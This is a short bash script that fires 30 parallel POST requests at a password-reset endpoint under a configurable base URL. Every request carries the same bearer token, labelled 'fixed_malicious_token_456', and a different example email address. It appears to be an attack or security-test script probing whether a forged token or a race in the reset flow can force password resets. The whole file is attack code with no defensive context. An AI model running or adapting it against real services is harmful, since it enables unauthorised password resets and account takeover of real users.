#!/bin/bash
TARGET="${BASE_URL}/reset_password"
TOKEN="fixed_malicious_token_456"

for i in $(seq 1 30); do
  curl -X POST "$TARGET" \
    -H "Authorization: Bearer $TOKEN" \
    -d "email=user$i@example.com" &
done
wait
